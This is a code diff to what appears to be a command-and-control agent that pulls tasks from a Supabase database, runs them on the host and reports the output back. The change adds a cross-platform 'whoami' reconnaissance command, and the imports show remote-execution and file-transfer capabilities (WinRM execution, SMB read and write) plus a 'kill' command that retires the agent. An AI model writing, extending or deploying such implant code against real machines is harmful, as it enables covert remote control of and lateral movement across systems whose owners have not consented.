@@ -8,10 +8,11 @@ from .config import SUPABASE_KEY
 
 # Conditional import based on the operating system
 if os.name == 'nt':  # 'nt' indicates Windows
-    from utils.winapi import wls, wami, list_users_in_group, smb_write
+    from utils.winapi import wls, list_users_in_group, smb_write
     from utils.winapi.smb_get import smb_get  # Ensure correct import
     from utils.winapi.winrm_execute import winrm_execute  # Import the winrm_execute function
     from utils.winapi.pwd import wpwd  # Import the wpwd function
+    from utils.winapi.wami import wami  # Import the wami function
 
 def handle_kill_command(command_id, command_text, hostname, supabase: Client):
     """Handles the kill command, updates the command status to 'Completed', marks the agent as 'Dead', and exits."""
@@ -92,15 +93,24 @@ def execute_commands(supabase: Client):
                     output = str(e)
                 update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
 
-            # Handle 'wami' command only if on Windows
-            elif os.name == 'nt' and command_text.lower() == 'wami':
-                try:
-                    result = wami()
-                    status = 'Completed'
-                    output = "\n".join(result)
-                except Exception as e:
-                    status = 'Failed'
-                    output = str(e)
+            # Handle 'whoami' command with OS check
+            elif command_text.lower() == 'whoami':
+                if os.name == 'nt':
+                    try:
+                        result = wami()
+                        status = 'Completed'
+                        output = "\n".join(result)
+                    except Exception as e:
+                        status = 'Failed'
+                        output = str(e)
+                else:
+                    try:
+                        result = os.popen('whoami').read()
+                        status = 'Completed'
+                        output = result
+                    except Exception as e:
+                        status = 'Failed'
+                        output = str(e)
                 update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
 
             # Handle 'users <group_name>' command only if on Windows
